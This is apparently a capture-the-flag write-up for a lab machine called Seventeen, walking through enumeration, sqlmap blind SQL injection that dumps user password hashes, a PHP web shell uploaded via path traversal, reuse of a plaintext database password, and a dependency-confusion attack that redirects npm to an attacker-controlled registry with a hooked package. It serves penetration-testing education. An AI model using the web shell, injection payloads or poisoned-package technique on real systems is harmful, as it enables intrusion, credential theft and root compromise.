> Author: **[kavigihan][author-profile]**

## Discovery

### Services

```shell
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:b2:6e:bb:92:7d:5e:6b:36:93:17:1a:82:09:e4:64 (RSA)
|   256 1f:57:c6:53:fc:2d:8b:51:7d:30:42:02:a4:d6:5f:44 (ECDSA)
|_  256 d5:a5:36:38:19:fe:0d:67:79:16:e6:da:17:91:eb:ad (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Lets begin your education with us! 
|_http-server-header: Apache/2.4.29 (Ubuntu)
8000/tcp open  http    Apache httpd 2.4.38
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
```

```shell
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
```

### Vhosts

```shell
gobuster vhost --domain seventeen.htb --append-domain --url http://10.10.11.165 -w /usr/share/wordlists/discovery/subdomains-top1million-20000.txt -o discovery/seventeen.htb/vhosts
# Found: gc._msdcs.seventeen.htb (Status: 400) [Size: 301]
# Found: exam.seventeen.htb (Status: 200) [Size: 17375]   
# Found: _domainkey.seventeen.htb (Status: 400) [Size: 301]
```

### Directories

For the subdomain `exam.seventeen.htb`:

```
/.html                (Status: 403) [Size: 276]
/admin                (Status: 301) [Size: 313] [--> http://exam.seventeen.htb/admin/]
/plugins              (Status: 301) [Size: 315] [--> http://exam.seventeen.htb/plugins/]
/.htm                 (Status: 403) [Size: 276]
/inc                  (Status: 301) [Size: 311] [--> http://exam.seventeen.htb/inc/]
/uploads              (Status: 301) [Size: 315] [--> http://exam.seventeen.htb/uploads/]
/assets               (Status: 301) [Size: 314] [--> http://exam.seventeen.htb/assets/]
/database             (Status: 301) [Size: 316] [--> http://exam.seventeen.htb/database/]
/classes              (Status: 301) [Size: 315] [--> http://exam.seventeen.htb/classes/]
/libs                 (Status: 301) [Size: 312] [--> http://exam.seventeen.htb/libs/]
/.                    (Status: 200) [Size: 17375]
/.htaccess            (Status: 403) [Size: 276]
/build                (Status: 301) [Size: 313] [--> http://exam.seventeen.htb/build/]
/.htc                 (Status: 403) [Size: 276]
/dist                 (Status: 301) [Size: 312] [--> http://exam.seventeen.htb/dist/]
/.html_var_DE         (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 283]
/.htpasswd            (Status: 403) [Size: 276]
/.html.               (Status: 403) [Size: 276]
/.html.html           (Status: 403) [Size: 276]
/.htpasswds           (Status: 403) [Size: 276]
/.htm.                (Status: 403) [Size: 276]
/.htmll               (Status: 403) [Size: 276]
/.html.old            (Status: 403) [Size: 276]
/.ht                  (Status: 403) [Size: 276]
/.html.bak            (Status: 403) [Size: 276]
/.htm.htm             (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.html1               (Status: 403) [Size: 276]
/.htgroup             (Status: 403) [Size: 276]
/.html.LCK            (Status: 403) [Size: 276]
/.html.printable      (Status: 403) [Size: 276]
/.htm.LCK             (Status: 403) [Size: 276]
/.htaccess.bak        (Status: 403) [Size: 276]
/.html.php            (Status: 403) [Size: 276]
/.htmls               (Status: 403) [Size: 276]
/.htx                 (Status: 403) [Size: 276]
/.html-               (Status: 403) [Size: 276]
/.htm2                (Status: 403) [Size: 276]
/.htlm                (Status: 403) [Size: 276]
/.htuser              (Status: 403) [Size: 276]
```

### Web browsing

`http://seventeen.htb:8000` is forbidden.

The frontpage looks static and mostly empty:

![][frontpage]

In the exam subdomain, the include `script.js` lists a few endpoins:

```javascript
_base_url_ + 'classes/Login.php?f=login'
_base_url_ + 'admin'
_base_url_ + 'classes/Login.php?f=login_client'
_base_url_ + 'classes/SystemSettings.php?f=update_settings'
```

Searching for the advertised author, [oretnom23][oretnom23], returns a lot of juicy information!

The repository for the ["Exam reviewer management system"][erms-repo] is flourished...

The default credentials from his githubs fail, but there's still information in the error message:

```shell
curl -i -s -k -X $'POST' \
    -H $'Host: exam.seventeen.htb' \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'PHPSESSID=fe1d948a617a4d5b3faf9dc2a45ad2f2' \
    --data-binary $'username=admin@username&password=admin@password' \
    $'http://exam.seventeen.htb/classes/Login.php?f=login'
```

```json
{"status":"incorrect","last_qry":"SELECT * from users where username = 'admin@username' and `password` = md5('f061d0e2f4e369e5b7f05744646f7416') "}
```

There are CVEs and exploits in the search results, this should lead somewhere.

## Dumping the databases

### ERMS

The vulnerable URL from the [SQLi exploit in Exploit-DB][erms-sqli] does not exactly match. In the original source, it is found in:

```shell
grep -rail take_exam .
# view_exam.php
```

And this is actually available in the index file on the server.

```shell
sqlmap -r take_exam.request --level=5 --risk=3 --dbms=mysql --dump
# ---
# Parameter: id (GET)
#     Type: boolean-based blind
#     Title: AND boolean-based blind - WHERE or HAVING clause
#     Payload: p=take_exam&id=1' AND 2898=2898-- kxAX

#     Type: time-based blind
#     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
#     Payload: p=take_exam&id=1' AND (SELECT 9635 FROM (SELECT(SLEEP(5)))Srsk)-- szFU
# ---
# [09:14:38] [INFO] resumed: erms_db
# [09:14:38] [INFO] fetching tables for database: 'erms_db'
# [09:14:38] [INFO] fetching number of tables for database 'erms_db'
# [09:14:38] [INFO] resumed: 6
# [09:14:38] [INFO] resumed: category_list
# [09:14:38] [INFO] resumed: exam_list
# [09:14:38] [INFO] resumed: option_list
# [09:14:38] [INFO] resumed: question_list
# [09:14:38] [INFO] resumed: system_info
# [09:14:38] [INFO] resumed: users
sqlmap -r take_exam.request --level=5 --risk=3 -p id --dbms=mysql --dump -D erms_db -T users
# +----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
# | id | type | avatar                            | lastname | password                         | username         | firstname    | date_added          | last_login | date_updated        |
# +----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
# | 1  | 1    | ../oldmanagement/files/avatar.png | Admin    | fc8ec7b43523e186a27f46957818391c | admin            | Adminstrator | 2021-01-20 14:02:37 | NULL       | 2022-02-24 22:00:15 |
# | 6  | 2    | ../oldmanagement/files/avatar.png | Anthony  | 48bb86d036bb993dfdcf7fefdc60cc06 | UndetectableMark | Mark         | 2021-09-30 16:34:02 | NULL       | 2022-05-10 08:21:39 |
# | 7  | 2    | ../oldmanagement/files/avatar.png | Smith    | 184fe92824bea12486ae9a56050228ee | Stev1992         | Steven       | 2022-02-22 21:05:07 | NULL       | 2022-02-24 22:00:24 |
# +----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
sqlmap -r take_exam.request --level=5 --risk=3 -p id --dbms=mysql --dump -D erms_db -T system_info
# +----+-------------+-------------------------------------------+
# | id | meta_field  | meta_value                                |
# +----+-------------+-------------------------------------------+
# | 1  | name        | Seventeen Exam Reviewer Management System |
# | 6  | short_name  | Examination Management System             |
# | 11 | logo        | uploads/l.jpg                             |
# | 13 | user_avatar | uploads/user_avatar.jpg                   |
# | 14 | cover       | uploads/1644023580_wallpaper.jpg          |
# +----+-------------+-------------------------------------------+
```

Indeed, SQLmap finds a blind injection and dumps the whole database!

`../oldmanagement/files/avatar.png` is most likely another website: it works on the port 8000.

### SFMS

`http://seventeen.htb:8000/oldmanagement/` is running "School File Management System", which has a [reported SQLi][sfms-sqli] too, on the admin page:

![][sfms-admin-login]

Indeed, the source code is available and we can see it in `login_query.php`:

```php
$query = mysqli_query($conn, "SELECT * FROM `user` WHERE `username` = '$username' && `password` = '$password'") or die(mysqli_error());
```

```shell
sqlmap -r oldmanagement.admin.request --level=5 --risk=3 --dbms=mysql -p username --dump --batch
```

But SQLmap doesn't find it... The student login should be vulnerable too, but it doesn't work either.

Actually, the original SQLi should give access to the databases for the other websites:

```shell
sqlmap -r /tmp/take_exam.request --level=5 --risk=3 -p id --dbms=mysql --current-user --current-db --passwords --schema
# [14:13:15] [INFO] fetching tables for databases: 'db_sfms, erms_db, information_schema, roundcubedb'
# [14:20:05] [INFO] fetched tables: 'roundcubedb.dictionary', 'roundcubedb.identities', 'roundcubedb.contacts', 'roundcubedb.searches', 'roundcubedb.contactgroups', 'roundcubedb.cache_index', 'roundcubedb.cache_messages', 'roundcubedb.cache_shared', 'roundcubedb.users', 'roundcubedb.session', 'roundcubedb.contactgroupmembers', 'roundcubedb.cache', 'roundcubedb.system', 'roundcubedb.cache_thread', 'erms_db.option_list', 'erms_db.category_list', 'erms_db.system_info', 'erms_db.users', 'erms_db.exam_list', 'erms_db.question_list', 'information_schema.INNODB_SYS_FOREIGN_COLS', 'information_schema.TABLE_PRIVILEGES', 'information_schema.TRIGGERS', 'information_schema.INNODB_BUFFER_PAGE_LRU', 'information_schema.ENGINES', 'information_schema.INNODB_FT_DEFAULT_STOPWORD', 'information_schema.TABLESPACES', 'information_schema.PLUGINS', 'information_schema.INNODB_TRX', 'information_schema.SESSION_STATUS', 'information_schema.INNODB_CMP', 'information_schema.INNODB_FT_DELETED', 'information_schema.INNODB_METRICS', 'information_schema.OPTIMIZER_TRACE', 'information_schema.VIEWS', 'information_schema.INNODB_SYS_FIELDS', 'information_schema.INNODB_SYS_INDEXES', 'information_schema.INNODB_FT_INDEX_CACHE', 'information_schema.SCHEMA_PRIVILEGES', 'information_schema.SCHEMATA', 'information_schema.COLLATIONS', 'information_schema.INNODB_CMPMEM', 'information_schema.INNODB_FT_CONFIG', 'information_schema.INNODB_FT_INDEX_TABLE', 'information_schema.COLUMN_PRIVILEGES', 'information_schema.KEY_COLUMN_USAGE', 'information_schema.USER_PRIVILEGES', 'information_schema.INNODB_SYS_FOREIGN', 'information_schema.INNODB_SYS_DATAFILES', 'information_schema.CHARACTER_SETS', 'information_schema.COLLATION_CHARACTER_SET_APPLICABILITY', 'information_schema.INNODB_BUFFER_POOL_STATS', 'information_schema.INNODB_CMPMEM_RESET', 'information_schema.EVENTS', 'information_schema.INNODB_SYS_TABLES', 'information_schema.PARAMETERS', 'information_schema.REFERENTIAL_CONSTRAINTS', 'information_schema.INNODB_FT_BEING_DELETED', 'information_schema.TABLE_CONSTRAINTS', 'information_schema.GLOBAL_VARIABLES', 'information_schema.INNODB_SYS_COLUMNS', 'information_schema.INNODB_CMP_PER_INDEX', 'information_schema.INNODB_TEMP_TABLE_INFO', 'information_schema.TABLES', 'information_schema.PROFILING', 'information_schema.ROUTINES', 'information_schema.PARTITIONS', 'information_schema.INNODB_LOCKS', 'information_schema.INNODB_SYS_TABLESPACES', 'information_schema.INNODB_SYS_VIRTUAL', 'information_schema.INNODB_CMP_RESET', 'information_schema.STATISTICS', 'information_schema.INNODB_BUFFER_PAGE', 'information_schema.COLUMNS', 'information_schema.INNODB_LOCK_WAITS', 'information_schema.INNODB_SYS_TABLESTATS', 'information_schema.INNODB_CMP_PER_INDEX_RESET', 'information_schema.FILES', 'information_schema.PROCESSLIST', 'information_schema.SESSION_VARIABLES', 'information_schema.GLOBAL_STATUS', 'db_sfms.student', 'db_sfms.user', 'db_sfms.storage'
sqlmap -r /tmp/take_exam.request --level=5 --risk=3 -p id --dbms=mysql -D db_sfms -T student --dump
# +---------+----+--------+---------+----------+----------------------------------------------------+-----------+
# | stud_id | yr | gender | stud_no | lastname | password                                           | firstname |
# +---------+----+--------+---------+----------+----------------------------------------------------+-----------+
# | 1       | 1A | Male   | 12345   | Smith    | 1a40620f9a4ed6cb8d81a1d365559233                   | John      |
# | 2       | 2B | Male   | 23347   | Mille    | abb635c915b0cc296e071e8d76e9060c                   | James     |
# | 3       | 2C | Female | 31234   | Shane    | a2afa567b1efdb42d8966353337d9024 (autodestruction) | Kelly     |
# | 4       | 3C | Female | 43347   | Hales    | a1428092eb55781de5eb4fd5e2ceb835                   | Jamie     |
# +---------+----+--------+---------+----------+----------------------------------------------------+-----------+
sqlmap -r /tmp/take_exam.request --level=5 --risk=3 -p id --dbms=mysql -D db_sfms -T user --dump
# +---------+---------------+---------------+----------------------------------+------------------+---------------+
# | user_id | status        | lastname      | password                         | username         | firstname     |
# +---------+---------------+---------------+----------------------------------+------------------+---------------+
# | 1       | administrator | Administrator | fc8ec7b43523e186a27f46957818391c | admin            | Administrator |
# | 2       | Regular       | Anthony       | b35e311c80075c4916935cbbbd770cef | UndetectableMark | Mark          |
# | 4       | Regular       | Smith         | 112dd9d08abf9dcceec8bc6d3e26b138 | Stev1992         | Steven        |
# +---------+---------------+---------------+----------------------------------+------------------+---------------+
sqlmap -r /tmp/take_exam.request --level=5 --risk=3 -p id --dbms=mysql -D db_sfms -T storage --dump
# +----------+---------+----------------------+-----------------+----------------------+
# | store_id | stud_no | filename             | file_type       | date_uploaded        |
# +----------+---------+----------------------+-----------------+----------------------+
# | 33       | 31234   | Marksheet-finals.pdf | application/pdf | 2020-01-26, 06:57 PM |
# +----------+---------+----------------------+-----------------+----------------------+
```

## Uploading a webshell

SQLmap derypted a hash, and we can now login as a student, "Kelly Shane":

![][student-portal]

The student "31234" has a message from a priviledged user "Mark" with a link:

> https://mastermailer.seventeen.htb/

File uploading is mentioned too, it may be time to try the famous webshell CVE! The upload form performs:

```
POST /oldmanagement/save_file.php HTTP/1.1
```

There are no filters in SFMS sources and the path can be tampered:

```php
$location = "files/".$stud_no."/".$file_name;
```

PHP execution is blocked on `/files/31234` but works one level above:

```
POST /oldmanagement/save_file.php HTTP/1.1
Host: seventeen.htb:8000
Content-Length: 575
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://seventeen.htb:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryi7lj1fWTmB44AgH8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://seventeen.htb:8000/oldmanagement/student_profile.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=c8b0b5a6a0c7bb5fc8cfbddd711d57ed
Connection: close

------WebKitFormBoundaryi7lj1fWTmB44AgH8
Content-Disposition: form-data; name="file"; filename="ws.php"
Content-Type: application/x-php

<html>
<body>
<b>Remote code execution:</b><br>
<pre>
    <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
</pre>
</body>
</html>

------WebKitFormBoundaryi7lj1fWTmB44AgH8
Content-Disposition: form-data; name="stud_no"

31234/..
------WebKitFormBoundaryi7lj1fWTmB44AgH8
Content-Disposition: form-data; name="save"


------WebKitFormBoundaryi7lj1fWTmB44AgH8--
```

And then `http://seventeen.htb:8000/oldmanagement/files/ws.php?cmd=cat%20/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
mark:x:1000:1000:,,,:/var/www/html:/bin/bash
```

## Escaping from the Docker container

A simple `grep -rail password` is enough:

```shell
grep -rail password /var/www | grep -viE 'skins|plugins|vendor|localization|roundcube' | grep -ai '.php'
# /var/www/html/mastermailer/index.php
# /var/www/html/mastermailer/program/include/rcmail.php
# /var/www/html/mastermailer/program/include/rcmail_output_html.php
# /var/www/html/mastermailer/installer/config.php
# /var/www/html/mastermailer/installer/test.php
# /var/www/html/mastermailer/config/config.inc.php
# /var/www/html/mastermailer/config/defaults.inc.php
# /var/www/html/mastermailer/index.php.bak
# /var/www/html/oldmanagement/admin/update_student.php
# /var/www/html/oldmanagement/admin/user.php
# /var/www/html/oldmanagement/admin/save_user.php
# /var/www/html/oldmanagement/admin/student.php
# /var/www/html/oldmanagement/admin/conn.php
# /var/www/html/oldmanagement/admin/login_query.php
# /var/www/html/oldmanagement/admin/save_student.php
# /var/www/html/oldmanagement/admin/login.php
# /var/www/html/oldmanagement/admin/update_user.php
# /var/www/html/oldmanagement/login_query.php
# /var/www/html/oldmanagement/login.php
# /var/www/html/employeemanagementsystem/changepassemp.php
# /var/www/html/employeemanagementsystem/process/dbh.php
# /var/www/html/employeemanagementsystem/process/aprocess.php
# /var/www/html/employeemanagementsystem/process/eprocess.php
# /var/www/html/employeemanagementsystem/process/addempprocess.php
# /var/www/html/employeemanagementsystem/edit.php
# /var/www/html/employeemanagementsystem/myprofileup.php
cat /var/www/html/employeemanagementsystem/process/dbh.php
# <?php

# $servername = "localhost";
# $dBUsername = "root";
# $dbPassword = "2020bestyearofmylife";
# $dBName = "ems";

# $conn = mysqli_connect($servername, $dBUsername, $dbPassword, $dBName);

# if(!$conn){
#     echo "Databese Connection Failed";
# }

# ?>
```

## Pivoting

The previous password works for "mark" on the host computer / server.

```shell
cat /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
# sys:x:3:3:sys:/dev:/usr/sbin/nologin
# sync:x:4:65534:sync:/bin:/bin/sync
# games:x:5:60:games:/usr/games:/usr/sbin/nologin
# man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
# lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
# mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
# news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
# uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
# proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
# backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
# list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
# irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
# gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
# nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
# systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
# systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
# syslog:x:102:106::/home/syslog:/usr/sbin/nologin
# messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
# _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
# lxd:x:105:65534::/var/lib/lxd/:/bin/false
# uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
# dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
# landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
# pollinate:x:109:1::/var/cache/pollinate:/bin/false
# sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
# kavi:x:1000:1000:kavi:/home/kavi:/bin/bash
# mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
# dovecot:x:112:116:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
# dovenull:x:113:117:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
# mark:x:1001:1001:,,,:/home/mark:/bin/bash
```

```shell
cat /var/mail/kavi
# To: kavi@seventeen.htb
# From: admin@seventeen.htb
# Subject: New staff manager application

# Hello Kavishka,
# Sorry I couldn't reach you sooner. Good job with the design. I loved it.
# I think Mr. Johnson already told you about our new staff management system. Since our old one had some problems, they are hoping maybe we could migrate to a more modern one. For the first phase, he asked us just a simple web UI to store the details of the staff members.
# I have already done some server-side for you. Even though, I did come across some problems with our private registry. However as we agreed, I removed our old logger and added loglevel instead. You just have to publish it to our registry and test it with the application. 
# Cheers,
# Mike
```

"just a simple web UI to store the details of the staff members"?? That's just what I need!

Also the mentions of loggers and registry is intriguing.

```shell
nmap -A -Pn -oN services.tcp.nmap 127.0.0.1
# PORT     STATE SERVICE  VERSION
# 22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
# | ssh-hostkey: 
# |   2048 2e:b2:6e:bb:92:7d:5e:6b:36:93:17:1a:82:09:e4:64 (RSA)
# |   256 1f:57:c6:53:fc:2d:8b:51:7d:30:42:02:a4:d6:5f:44 (ECDSA)
# |_  256 d5:a5:36:38:19:fe:0d:67:79:16:e6:da:17:91:eb:ad (EdDSA)
# 80/tcp   open  http     Apache httpd 2.4.29 ((Ubuntu))
# |_http-server-header: Apache/2.4.29 (Ubuntu)
# |_http-title: Let's begin your education with us! 
# 110/tcp  open  pop3     Dovecot pop3d
# |_pop3-capabilities: STLS USER UIDL PIPELINING AUTH-RESP-CODE CAPA RESP-CODES SASL(PLAIN) TOP
# | ssl-cert: Subject: commonName=testserver
# | Subject Alternative Name: DNS:testserver
# | Not valid before: 2022-02-21T09:34:29
# |_Not valid after:  2032-02-19T09:34:29
# |_ssl-date: TLS randomness does not represent time
# 143/tcp  open  imap     Dovecot imapd (Ubuntu)
# |_imap-capabilities: IDLE AUTH=PLAINA0001 ID SASL-IR LOGIN-REFERRALS STARTTLS Pre-login capabilities IMAP4rev1 more post-login ENABLE have OK listed LITERAL+
# | ssl-cert: Subject: commonName=testserver
# | Subject Alternative Name: DNS:testserver
# | Not valid before: 2022-02-21T09:34:29
# |_Not valid after:  2032-02-19T09:34:29
# |_ssl-date: TLS randomness does not represent time
# 993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
# |_imap-capabilities: IDLE AUTH=PLAINA0001 ID SASL-IR LOGIN-REFERRALS Pre-login capabilities IMAP4rev1 more post-login ENABLE have OK listed LITERAL+
# | ssl-cert: Subject: commonName=testserver
# | Subject Alternative Name: DNS:testserver
# | Not valid before: 2022-02-21T09:34:29
# |_Not valid after:  2032-02-19T09:34:29
# |_ssl-date: TLS randomness does not represent time
# 995/tcp  open  ssl/pop3 Dovecot pop3d
# |_pop3-capabilities: TOP USER UIDL PIPELINING RESP-CODES AUTH-RESP-CODE SASL(PLAIN) CAPA
# | ssl-cert: Subject: commonName=testserver
# | Subject Alternative Name: DNS:testserver
# | Not valid before: 2022-02-21T09:34:29
# |_Not valid after:  2032-02-19T09:34:29
# |_ssl-date: TLS randomness does not represent time
# 6000/tcp open  http     Apache httpd 2.4.38 ((Debian))
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: 403 Forbidden
# 6001/tcp open  http     Apache httpd 2.4.38
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: 403 Forbidden
# 6002/tcp open  http     Apache httpd 2.4.38
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: 403 Forbidden
# 6003/tcp open  http     Apache httpd 2.4.38
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: 403 Forbidden
# 6004/tcp open  http     Apache httpd 2.4.38
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: 403 Forbidden
# 6005/tcp open  http     Apache httpd 2.4.38
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: 403 Forbidden
# 6006/tcp open  http     Apache httpd 2.4.38
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: 403 Forbidden
# 6007/tcp open  http     Apache httpd 2.4.38
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: 403 Forbidden
# 6009/tcp open  http     Apache httpd 2.4.38
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: 403 Forbidden
# 8081/tcp open  http     Apache httpd 2.4.38 ((Debian))
# | http-cookie-flags: 
# |   /: 
# |     PHPSESSID: 
# |_      httponly flag not set
# |_http-server-header: Apache/2.4.38 (Debian)
# |_http-title: Seventeen Exam Reviewer Management System
nmap -A -Pn -p 4873 -oN services.tcp.4873.nmap 127.0.0.1
# PORT     STATE SERVICE VERSION
# 4873/tcp open  unknown
# | fingerprint-strings: 
# |   DNSStatusRequest, DNSVersionBindReq, Help, Kerberos, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
# |     HTTP/1.1 400 Bad Request
# |     Connection: close
# |   FourOhFourRequest: 
# |     HTTP/1.1 403 Forbidden
# |     Access-Control-Allow-Origin: *
# |     Content-Type: application/json; charset=utf-8
# |     Content-Length: 33
# |     ETag: W/"21-gxPGy8RwM7ana23iNasr/U+NIcA"
# |     Vary: Accept-Encoding
# |     Date: Mon, 13 Jun 2022 17:27:55 GMT
# |     Connection: close
# |     "error": "invalid package"
# |   GetRequest: 
# |     HTTP/1.1 500 Internal Server Error
# |     Access-Control-Allow-Origin: *
# |     X-Frame-Options: deny
# |     Content-Security-Policy: connect-src 'self'
# |     X-Content-Type-Options: nosniff
# |     X-XSS-Protection: 1; mode=block
# |     Content-Type: application/json; charset=utf-8
# |     Content-Length: 39
# |     ETag: W/"27-/hJgrcw+XR/TN16YOmhj0wZyJYc"
# |     Vary: Accept-Encoding
# |     Date: Mon, 13 Jun 2022 17:27:55 GMT
# |     Connection: close
# |     "error": "internal server error"
# |   HTTPOptions: 
# |     HTTP/1.1 204 No Content
# |     Access-Control-Allow-Origin: *
# |     Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
# |     Vary: Access-Control-Request-Headers
# |     Content-Length: 0
# |     Date: Mon, 13 Jun 2022 17:27:55 GMT
# |_    Connection: close
```

Now we have:

```
mark 2020bestyearofmylife
kavi IhateMathematics123#
```

## Rooting

As user `kavi`:

```shell
sudo -l
# User kavi may run the following commands on seventeen:
#     (ALL) /opt/app/startup.sh
ls -lah /opt/app/
# -rwxr-xr-x  1 root root  158 Mar 13 17:26 index.html
# -rwxr-xr-x  1 root root  781 Mar 15 19:58 index.js
# drwxr-xr-x 14 root root 4.0K May 10 17:45 node_modules
# -rwxr-xr-x  1 root root  465 May 29 14:01 startup.sh
cat /opt/app.startup.sh
# deps=('db-logger' 'loglevel')
# for dep in ${deps[@]}; do
#     /bin/echo "[=] Checking for $dep"
#     o=$(/usr/bin/npm -l ls|/bin/grep $dep)

#     if [[ "$o" != *"$dep"* ]]; then
#         /bin/echo "[+] Installing $dep"
#         /usr/bin/npm install $dep --silent
#         /bin/chown root:root node_modules -R
#     else
#         /bin/echo "[+] $dep already installed"

#     fi
# done
```

This is a NodeJS app, whose install script can run as root.

### Installing the app

The startup script will install all dependencies and start the app.

The actual files land in `~/.npm`:

```shell
sudo /opt/app/startup.sh
ls -lah .npm
# drwxr-xr-x 4 kavi kavi 4.0K Jun 14 18:54 127.0.0.1_4873
# drwxr-xr-x 2 kavi kavi 4.0K Jun 14 18:54 _locks
# drwxr-xr-x 3 kavi kavi 4.0K Jun 14 18:54 loglevel
# drwxr-xr-x 3 kavi kavi 4.0K Jun 14 18:54 mysql
```

### Dependency confusion attack

Looking at `~/.npm` made me notice:

```shell
cat /home/kavi/.npmrc
# registry=http://127.0.0.1:4873/
```

So the local app at `/opt/app` will install dependencies from a local registry:

```shell
grep -ai require /opt/app/index.js
# const http = require('http')
# const fs = require('fs')
# //var logger = require('db-logger')
# var logger = require('loglevel')
```

Now we can point NPM to our own server and host a malicious version of `loglevel` with:

```shell
echo 'registry=http://10.10.16.5:4873/' > /home/kavi/.npmrc
```

Listen on our side and run the app with:

```shell
# attacker
nc -lvn 10.10.16.5 4873
# target
sudo /opt/app/startup.sh
```

It works!

```
Ncat: Connection from 10.10.11.165.
Ncat: Connection from 10.10.11.165:49504.
GET /loglevel HTTP/1.1
accept-encoding: gzip
version: 3.5.2
accept: application/json
referer: install loglevel
npm-session: 42f835f5666b8b4d
user-agent: npm/3.5.2 node/v8.10.0 linux x64
host: 10.10.16.5:4873
Connection: keep-alive
```

```
[+] Installing loglevel
▌ ╢░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
```

This is called a ["dependency confusion attack"][snyk-dca]. 

### Creating a private registry

This is well documented and most easy with Docker:

```shell
docker pull verdaccio/verdaccio
docker run -it --rm --name verdaccio -p 4873:4873 verdaccio/verdaccio
```

### Hosting a malicious package

Now we create a fake package "loglevel" with `npm init`:

```json
{
  "name": "loglevel",
  "version": "13.37.0",
  "description": "dca",
  "main": "index.js",
  "scripts": {
    "install": "touch /tmp/pwney",
    "test": "touch /tmp/pwney"
  },
  "author": "apehex",
  "license": "ISC"
}
```

Make sure the version is high enough to justify an update.

This first version is for testing purpose: this simple `touch` hook will ensure that the server is reachable and that hooks are actually triggered.

Next we publish it:

```shell
sudo npm adduser --registry http://localhost:4873
npm login --registry http://localhost:4873
npm publish  --registry http://localhost:4873
```

And on the target machine:

```shell
sudo /opt/app/startup.sh
```

